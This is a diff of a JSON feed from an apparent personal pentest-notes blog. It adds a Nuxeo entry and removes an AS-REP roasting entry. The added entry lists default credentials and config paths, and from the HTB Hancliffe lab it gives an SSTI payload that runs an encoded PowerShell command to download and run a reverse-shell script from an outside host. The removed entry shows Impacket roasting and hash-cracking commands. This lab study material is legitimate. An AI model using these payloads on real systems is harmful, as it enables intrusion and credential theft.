@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/05/19/nuxeo",
+            "title": "Nuxeo",
+            "summary": "Nuxeo",
+            "content_text": "Oveview  Collaboration system  Tech stack          Tomcat      Elasticsearch      DB (PostgreSQL, Mysql)      Version Detection  You can see copyright as well as version infromation at the bottom of login page# Version is 10.2Copyright © 2001-2022 Nuxeo and respective authors. Nuxeo Platform FT 10.2Credentials# DefaultAdministrator:Administrator# Some DB Users to trynuxeoInteresting Files and Directories# Nuxeo config. You can see DB passwords here.C:\\programdata\\nuxeo\\conf\\nuxeo.conf# Some tomcat configconf/# User settings?~/.nxshellC:\\users\\svc_account\\.nxshell\\historyC:\\users\\svc_account\\.nxshell\\shell.propertiesInteresting URL paths/nuxeo/nuxeo/login.jsp/nxserver/nxstartup.facesInteresting Database TablesusersdigestauthcontentgroupsuserinfonoteInteresting Elasticearch Datacurl 'http://localhost:9200/nuxeo-audit/_search?pretty=true'curl 'http://localhost:9200/nuxeo/_search?pretty=true'Vulnerabilities, Attacks and Exploits  Orange: How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System  Nuxeo 10 Authentication Bypass and RCE using SSTI# HTB Hancliffe payload. Take note there is a URI parsing# vulnerability that's why there is a `/maintenance/..;/`http://hancliffe/maintenance/..;/login.jsp/pwn$%7B7+7%7D.xhtml# Another payload but with powershell encoded commandhttp://hancliffe/maintenance/..;/login.jsp/pwn$%7B%22%22.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22powershell%20-encodedcommand%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMANAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA=%22,null).waitFor()%7D.xhtmlReferences  Wikipedia  GitHub - nuxeo/nuxeo: Content management platform to build modern business applications",
+            "content_html": "<h2 id=\"oveview\">Oveview</h2><p><img src=\"/spindel/assets/Nuxeo/CAP-dashboard.png\" alt=\"\" /></p><ul>  <li>Collaboration system</li>  <li>Tech stack    <ul>      <li>Tomcat</li>      <li>Elasticsearch</li>      <li>DB (PostgreSQL, Mysql)</li>    </ul>  </li></ul><h2 id=\"version-detection\">Version Detection</h2><ul>  <li>You can see copyright as well as version infromation at the bottom of login page</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Version is 10.2</span>Copyright © 2001-2022 Nuxeo and respective authors. Nuxeo Platform FT 10.2</code></pre></div></div><h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Default</span>Administrator:Administrator<span class=\"c\"># Some DB Users to try</span>nuxeo</code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nuxeo config. You can see DB passwords here.</span>C:<span class=\"se\">\\p</span>rogramdata<span class=\"se\">\\n</span>uxeo<span class=\"se\">\\c</span>onf<span class=\"se\">\\n</span>uxeo.conf<span class=\"c\"># Some tomcat config</span>conf/<span class=\"c\"># User settings?</span>~/.nxshellC:<span class=\"se\">\\u</span>sers<span class=\"se\">\\s</span>vc_account<span class=\"se\">\\.</span>nxshell<span class=\"se\">\\h</span>istoryC:<span class=\"se\">\\u</span>sers<span class=\"se\">\\s</span>vc_account<span class=\"se\">\\.</span>nxshell<span class=\"se\">\\s</span>hell.properties</code></pre></div></div><h2 id=\"interesting-url-paths\">Interesting URL paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>/nuxeo/nuxeo/login.jsp/nxserver/nxstartup.faces</code></pre></div></div><h2 id=\"interesting-database-tables\">Interesting Database Tables</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">users</span>digestauthcontent<span class=\"nb\">groups</span>userinfonote</code></pre></div></div><h2 id=\"interesting-elasticearch-data\">Interesting Elasticearch Data</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"s1\">'http://localhost:9200/nuxeo-audit/_search?pretty=true'</span>curl <span class=\"s1\">'http://localhost:9200/nuxeo/_search?pretty=true'</span></code></pre></div></div><h2 id=\"vulnerabilities-attacks-and-exploits\">Vulnerabilities, Attacks and Exploits</h2><ul>  <li><a href=\"https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html\">Orange: How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System</a></li>  <li><a href=\"https://github.com/mpgn/CVE-2018-16341\">Nuxeo 10 Authentication Bypass and RCE using SSTI</a></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># HTB Hancliffe payload. Take note there is a URI parsing</span><span class=\"c\"># vulnerability that's why there is a `/maintenance/..;/`</span>http://hancliffe/maintenance/..<span class=\"p\">;</span>/login.jsp/pwn<span class=\"nv\">$%</span>7B7+7%7D.xhtml<span class=\"c\"># Another payload but with powershell encoded command</span>http://hancliffe/maintenance/..<span class=\"p\">;</span>/login.jsp/pwn<span class=\"nv\">$%</span>7B%22%22.getClass<span class=\"o\">()</span>.forName<span class=\"o\">(</span>%22java.lang.Runtime%22<span class=\"o\">)</span>.getMethod<span class=\"o\">(</span>%22getRuntime%22,null<span class=\"o\">)</span>.invoke<span class=\"o\">(</span>null,null<span class=\"o\">)</span>.exec<span class=\"o\">(</span>%22powershell%20-encodedcommand%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMANAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA<span class=\"o\">=</span>%22,null<span class=\"o\">)</span>.waitFor<span class=\"o\">()</span>%7D.xhtml</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://en.wikipedia.org/wiki/Nuxeo\">Wikipedia</a></li>  <li><a href=\"https://github.com/nuxeo/nuxeo\">GitHub - nuxeo/nuxeo: Content management platform to build modern business applications</a></li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/05/19/nuxeo",
+            
+            
+            
+            "tags": ["rce","cms","enum","java","ssti","web"],
+            
+            "date_published": "2022-05-19T00:00:00+08:00",
+            "date_modified": "2022-05-19T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/05/18/splunk-wispherer",
             "title": "Splunk Wispherer",
             "summary": "Splunk Wispherer",
@@ -846,30 +870,6 @@
             
             "date_published": "2022-03-08T00:00:00+08:00",
             "date_modified": "2022-03-08T00:00:00+08:00",
-            
-                "author":  {
-                "name": "spindel",
-                "url": null,
-                "avatar": null
-                }
-                
-            
-        },
-    
-        {
-            "id": "https://mvineza.github.io/spindel/2022/03/07/as-rep-roasting-using-impacket",
-            "title": "AS-REP Roasting using Impacket",
-            "summary": "AS-REP Roasting using Impacket",
-            "content_text": "Overview  With valid usernames, attacker can intercept NTLMv2 hash and crack it to get the password because pre-authentication phase is disabled  One way of getting valid usernames is to use [[Kerbrute]] technique  See [[AS-REP]] for theory behind this attackSteps  Add DC entry to hosts file10.10.135.224 SPOOKYSEC.local  Get a list of valid accounts using [[Kerbrute]]  Put them into a txt filesvc-admin@spookysec.localJames@spookysec.localrobin@spookysec.localdarkstar@spookysec.localadministrator@spookysec.localbackup@spookysec.localparadox@spookysec.localJAMES@spookysec.localRobin@spookysec.localAdministrator@spookysec.local  Run impacket to determine what accounts are AS-REP roastablepython3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SPOOKYSEC.local/ -usersfile users.txt -format john -outputfile out.john -no-pass  Here is an example output.  Crack the hashes and enjoy!john --wordlist=/usr/share/wordlists/rockyou.txt out.johnGotchasI encounter an issue on THM ra box. Output tells that user doesn’t require preauth set.[-] User buse@windcorp.thm doesn't have UF_DONT_REQUIRE_PREAUTH setBut then there was no hashes dumped. When I checked the connections in wireshark, I see that its requiring pre auth!",
-            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>With valid usernames, attacker can intercept NTLMv2 hash and crack it to get the password because pre-authentication phase is disabled</li>  <li>One way of getting valid usernames is to use [[Kerbrute]] technique</li>  <li>See [[AS-REP]] for theory behind this attack</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Add DC entry to hosts file</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>10.10.135.224 SPOOKYSEC.local</code></pre></div></div><ul>  <li>Get a list of valid accounts using [[Kerbrute]]</li>  <li>Put them into a txt file</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>svc-admin@spookysec.localJames@spookysec.localrobin@spookysec.localdarkstar@spookysec.localadministrator@spookysec.localbackup@spookysec.localparadox@spookysec.localJAMES@spookysec.localRobin@spookysec.localAdministrator@spookysec.local</code></pre></div></div><ul>  <li>Run impacket to determine what accounts are AS-REP roastable</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SPOOKYSEC.local/ -usersfile users.txt -format john -outputfile out.john -no-pass</code></pre></div></div><ul>  <li>Here is an example output.</li></ul><p><img src=\"/spindel/assets/AS-REP%20Roasting%20using%20Impacket/76430BF0-31FD-4DBF-A15F-81F0CFB51661.png\" alt=\"\" /></p><ul>  <li>Crack the hashes and enjoy!</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>john <span class=\"nt\">--wordlist</span><span class=\"o\">=</span>/usr/share/wordlists/rockyou.txt out.john</code></pre></div></div><h2 id=\"gotchas\">Gotchas</h2><p>I encounter an issue on THM ra box. Output tells that user doesn’t require preauth set.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>[-] User buse@windcorp.thm doesn't have UF_DONT_REQUIRE_PREAUTH set</code></pre></div></div><p>But then there was no hashes dumped. When I checked the connections in wireshark, I see that its requiring pre auth!</p><p><img src=\"/spindel/assets/AS-REP%20Roasting%20using%20Impacket/A89116D4-A26E-46F4-9C17-44EF3E91FA4D.png\" alt=\"\" /></p>",
-            "url": "https://mvineza.github.io/spindel/2022/03/07/as-rep-roasting-using-impacket",
-            
-            
-            
-            "tags": ["windows","ad","kerberos","foothold"],
-            
-            "date_published": "2022-03-07T00:00:00+08:00",
-            "date_modified": "2022-03-07T00:00:00+08:00",
             
                 "author":  {
                 "name": "spindel",
